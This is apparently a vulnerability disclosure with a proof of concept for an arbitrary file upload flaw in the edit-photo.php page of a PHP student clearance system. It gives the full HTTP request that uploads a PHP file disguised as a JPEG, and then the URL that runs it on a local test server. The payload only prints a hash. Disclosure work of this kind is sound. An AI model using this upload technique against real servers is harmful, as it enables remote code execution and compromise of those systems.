### Web-Based Student Clearance System - Arbitrary File Upload

### Date: 2024-02/26
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/15627/web-based-student-clearance-system.html
### Tested on: MacOs13.5 + phpstudy

# /edit-photo.php（Arbitrary File Upload）

### 1,login System

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708932334103.jpg "Web-Based Student Clearance System")

### 2,edit photo Sample request POC #1

```
POST /edit-photo.php HTTP/1.1
Host: 127.0.0.1:8889
Content-Length: 309
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8889
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryg5TBlypbgZwnRdxp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8889/edit-photo.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=b79eb3fij4s19ggvqglf3v59te; __insuarance__logged=1; __insuarance__key=LJNT16FPPDNJD0PJG1Z8
Connection: close

------WebKitFormBoundaryg5TBlypbgZwnRdxp
Content-Disposition: form-data; name="userImage"; filename="1708927196358.php"
Content-Type: image/jpeg

<?php echo md5(1);?>
------WebKitFormBoundaryg5TBlypbgZwnRdxp
Content-Disposition: form-data; name="btnedit"


------WebKitFormBoundaryg5TBlypbgZwnRdxp--

```

### 3,Accessing avatars
```
http://127.0.0.1:8889/uploads/1708927196358.php
```
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1708932508546.jpg "Web-Based Student Clearance System")

